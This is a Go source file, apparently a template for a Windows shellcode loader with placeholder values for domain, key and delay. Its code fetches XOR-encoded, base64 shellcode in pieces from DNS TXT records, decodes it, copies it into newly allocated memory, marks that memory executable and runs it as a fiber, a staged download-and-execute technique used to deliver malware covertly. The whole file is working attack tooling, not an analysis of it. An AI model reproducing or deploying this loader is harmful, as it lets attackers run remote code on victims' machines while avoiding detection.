package main

import (
	"encoding/base64"
	"encoding/hex"
	"unsafe"

	"net"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
	"golang.org/x/sys/windows"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

//The technique used to inject and run the payload was used from this repository https://github.com/Ne0nd0g/go-shellcode
func runShellcode(hexShellcode string) {

	shellcode, _ := hex.DecodeString(hexShellcode)

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")

	fiberAddr, _, _ := ConvertThreadToFiber.Call()

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	fiber, _, _ := CreateFiber.Call(0, addr, 0)

	SwitchToFiber.Call(fiber)

	SwitchToFiber.Call(fiberAddr)
}

func retreiveShellcodeAsBytes() []byte {
	//You can replace the DNS servers used to retreive the shell code, where you can define them in the format "nameserver <ip>" and separated using \n
	reader := strings.NewReader("nameserver 8.8.8.8\nnameserver 8.8.4.4")
	dnsConfig, _ := dns.ClientConfigFromReader(reader)
	dnsClient := new(dns.Client)
	txtRecords := ""

	i := 0
	// This will increment through the TXT records until it cannot find any addiitonal records
	for {
		dnsMessage := new(dns.Msg)
		dnsMessage.SetQuestion(dns.Fqdn("{PREFIX}"+strconv.Itoa(i)+".{DOMAIN}"), dns.TypeTXT)
		dnsMessage.RecursionDesired = true
		dnsResponse, _, _ := dnsClient.Exchange(dnsMessage, net.JoinHostPort(dnsConfig.Servers[0], dnsConfig.Port))

		if len(dnsResponse.Answer) < 1 {
			break
		}
		
		txtRecord := strings.Split(dnsResponse.Answer[0].String(), "\t")[4]
		txtRecords = txtRecords + strings.Replace(txtRecord, "\"", "", -1)
		time.Sleep({SLEEP} * 1000 * time.Millisecond)
		i++
	}

	decodedBase64, _ := base64.StdEncoding.DecodeString(txtRecords)

	//Decode the shellcode by XORing it with the predefined key (If the shellcode is not encoded, use 0x00)
	decodedBytes := make([]byte, len(decodedBase64))
	for i := 0; i < len(decodedBase64); i++ {
		decodedBytes[i] = decodedBase64[i] ^ {KEY}
	}

	return decodedBytes
}

func retreiveShellcodeAsHex() string {
	decodedShellcodeAsHex := hex.EncodeToString(retreiveShellcodeAsBytes())
	return decodedShellcodeAsHex
}

func main() {
	runShellcode(retreiveShellcodeAsHex())
}
